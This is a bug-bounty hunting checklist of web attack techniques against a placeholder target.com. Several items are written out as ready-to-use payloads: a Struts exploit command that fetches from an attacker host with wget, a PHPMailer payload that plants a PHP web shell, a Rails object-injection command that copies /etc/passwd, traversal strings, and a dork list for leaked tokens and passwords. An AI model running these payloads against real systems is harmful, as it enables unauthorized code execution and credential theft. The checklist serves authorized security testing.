# Smart Hunting
## Bugs
- [ ] Add header in the proxy > Options (`X-Forwarded-Host: target.com`) - browse the program and then later click burp > search and try to find your `X-Forwarded-Host` value for web cache deception
- [ ] HTTP Request Smuggling
- [ ] Apply on .xhtml
- [ ] `Python struts-pwn.py -u http://target.com/orders.xhtml -c "wget http://ip:1337/test" --exploit`
- [ ] Test for Electronic Code Book (AAAAAAA aaaaaa BBBBB)
- [ ] `CVE-2016-10033`: PHPMailer RCE
email: "attacker@127.0.0.1\" -oQ/tmp/ -X/var/www/shell.php root"@127.0.0.1
subject: <?php system($_GET['c']);?>
- [ ] Change all request to `TRACE` method to disclose or access info
- [ ] `blc http://target.com -ro` (check for broken links)
- [ ] `targetname.atlassian.net`
- [ ] `jira.target.com`
- [ ] Vhost testing
- [ ] Test for bukets
- [ ] Check Github & dork list
(api,token,username,password,secret,dev,prod,jenkins,config,ssh,ftp,MYSQL_PASSWORD,admin,AWS,buket,GITHUB_TOKEN)
- [ ] `gau target.com`
- [ ] `waybackurls target.com`
- [ ] Accessing misconfigured data of an org: `https://storage.googleapis.com/<org-name>`
- [ ] Unauthorized access to org's google groups: `https://groups.google.com/a/<domain-name>`
- [ ] If running ruby on rails then: Accept: `../../../../../../../../etc/passwd{{`
- [ ] `CVE-2013-0156`: Rails Object Injection: ruby rails_rce.rb http://target.com 'cp /etc/passwd public/me.txt'
(https://gist.githubusercontent.com/postmodern/4499206/raw/a68d6ff8c1f9570a09365036aeb96f6a9fff7121/rails_rce.rb)
- [ ] `CVE-2019-11043`: Hint: PHP based website on NGINX phuip-fpizdam http://target.com/anyphpfile.php
- [ ] Check for CRLF Injection
- [ ] Bypass Open-Redirection protection
- [ ] Keyfinder
- [ ] Check email verification `admin@target.com`
- [ ] `target.com/home/....4....json` (Will disclose all the content of the home dir + sensitive info)
- [ ] `CVE-2019-19781`: Citrix NetScaler Directory Traversal: `curl -vk -path-as-is https://$TARGET/vpn/../vpns/ 2>&1 | grep "You don't have permission to access /vpns/" >/dev/null && echo "VULNERABLE: $TARGET" || echo "MITIGATED: $TARGET"`
### Blind XSS
- [ ] Blind XSS Payload in `User-Agent` header
- [ ] BXSS payload while logging (Enter the BXSS payload in forget pass, login, signup to generate errors)
- [ ] Use BXSS payload as your password
- [ ] etc ...